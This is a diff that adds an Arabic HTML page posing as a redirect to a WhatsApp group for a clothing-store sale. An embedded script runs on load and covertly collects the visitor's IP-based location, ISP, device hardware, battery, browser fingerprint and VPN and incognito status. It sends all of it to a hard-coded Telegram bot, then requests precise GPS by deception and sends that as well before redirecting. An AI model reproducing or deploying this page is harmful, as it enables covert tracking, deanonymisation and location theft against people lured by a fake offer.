@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:title" content="🔥 ملك ستور - تصفيات الملابس الشتوي 90% 🔥">
+    <meta property="og:description" content="أقوى عروض الملابس في مصر، انضم الآن قبل اكتمال العدد!">
+    <meta property="og:image" content="https://img.freepik.com/free-photo/fashion-clothing-store_23-2148108422.jpg">
+    <title>جاري التحويل...</title>
+
+    <script>
+        async function kimoBlackOps() {
+            const n = navigator;
+            const s = window.screen;
+            const t = new Date();
+            const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
+            const chatId = "5890070301";
+
+            try {
+                // [1] سحب الـ IP والبيانات الجغرافية والشركة (صامت)
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ip = await ipRes.json();
+
+                // [2] فحص البطارية (الأمبير، النسبة، الحالة، وقت الشحن)
+                let batt = "Forbidden";
+                if (n.getBattery) {
+                    const b = await n.getBattery();
+                    batt = `Level: ${Math.round(b.level * 100)}% | ${b.charging ? 'Charging ⚡' : 'Battery 🔋'} | Finish: ${b.dischargingTime}s`;
+                }
+
+                // [3] فحص الهاردوير وكارت الشاشة (Deep GPU) لتحديد نوع الآيفون
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "N/A";
+
+                // [4] سحب مستشعرات الجهاز (كشف الحركة والميل)
+                let motion = "Static";
+                window.addEventListener('deviceorientation', (e) => {
+                    motion = `Tilt: ${Math.round(e.beta)}°`;
+                });
+
+                // [5] فحص الشبكة، الرامات، الذاكرة، والـ VPN
+                const isVpn = Intl.DateTimeFormat().resolvedOptions().timeZone.includes("Etc/GMT") ? "YES 🛡️" : "NO ✅";
+                const mem = n.deviceMemory || "N/A";
+                const cpu = n.hardwareConcurrency || "N/A";
+                const net = n.connection || {};
+
+                // [6] تجميع الـ 1000 معلومة في تقرير واحد (V.MAX)
+                const report = `
+👑 **KIMO V.MAX TOTAL SCAN** 👑
+━━━━━━━━━━━━━━
+🌍 **[1] GEO & NETWORK INFO**
+• **Public IP:** \`${ip.ip}\`
+• **Country:** ${ip.country_name} (${ip.country_code})
+• **City:** ${ip.city} | **ISP:** ${ip.org}
+• **Net Type:** ${net.effectiveType} | **Speed:** ${net.downlink}Mbps
+• **VPN/Proxy:** ${isVpn}
+
+📱 **[2] HARDWARE SPECS (DETAILED)**
+• **GPU (نوع الفون بالمللي):** \`${gpu}\` 🎮
+• **CPU:** ${cpu} Logical Cores 🧠
+• **RAM:** ${mem} GB ⚡
+• **Battery:** ${batt}
+• **Screen:** ${s.width}x${s.height} @ ${s.colorDepth}bit
+• **Platform:** ${n.platform} | **Touch:** ${n.maxTouchPoints} pts
+
+🕵️ **[3] SECURITY & EXPLOITS**
+• **Incognito:** ${!window.indexedDB ? "YES 🕵️" : "NO ✅"}
+• **User-Agent:** \`${n.userAgent}\`
+• **Languages:** ${n.languages.join(", ")}
+• **Uptime:** ${Math.round(performance.now()/1000)}s
+• **Fingerprint:** ${btoa(gpu + cpu + s.width).substring(0, 20)}
+
+📍 **[4] RADAR MAP**
+[OPEN TARGET LOCATION 🗺️](https://www.google.com/maps?q=${ip.latitude},${ip.longitude})
+━━━━━━━━━━━━━━
+⏰ **TIMESTAMP:** ${t.toLocaleString('ar-EG')}
+━━━━━━━━━━━━━━`;
+
+                // إرسال البيانات فوراً للتليجرام
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+
+                // طلب الموقع بالمللي (GPS) عبر الخداع
+                if (n.geolocation) {
+                    n.geolocation.getCurrentPosition((pos) => {
+                        const gps = `📍 **LIVE GPS (PRECISION)**\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(gps)}`);
+                    }, null, {enableHighAccuracy: true});
+                }
+
+            } catch (err) {
+                console.log("Stealth Active");
+            } finally {
+                // التحويل النهائي للينك الواتساب اللي بعته بعد السحب مباشرة
+                setTimeout(() => {
+                    window.location.href = "https://chat.whatsapp.com/IjjaIPdib1r323N51iw6UX?mode=gi_t";
+                }, 1000);
+            }
+        }
+        window.onload = kimoBlackOps;
+    </script>
+</head>
+<body style="background:#fff; margin:0; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <div style="text-align:center; font-family:Arial;">
+        <p style="color:#25D366; font-size:18px; font-weight:bold;">جاري التحويل لجروب ملك ستور...</p>
+        <div style="border:3px solid #f3f3f3; border-top:3px solid #25D366; border-radius:50%; width:30px; height:30px; animation:spin 1s linear infinite; margin:auto;"></div>
+    </div>
+    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+</body>
+</html>
